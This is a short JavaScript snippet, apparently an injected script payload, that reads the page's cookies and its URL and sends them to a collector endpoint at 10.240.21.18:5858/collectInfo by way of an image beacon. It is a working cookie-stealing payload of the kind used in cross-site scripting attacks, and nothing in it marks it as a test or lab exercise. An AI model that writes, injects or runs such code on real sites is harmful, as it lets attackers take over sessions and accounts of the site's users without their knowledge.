(function(){
    var img = new Image();

    var url = 'http://10.240.21.18:5858/collectInfo';
    var search = '?site='+location.href;
    var token = getCookie();

    if(token){
        search +=  '&token='+token
    }
    url += decodeURIComponent(search);

    img.src = url;

    document.body.appendChild(img)

    // debugger;


    function getCookie(){
        return document.cookie || '';
    }
})();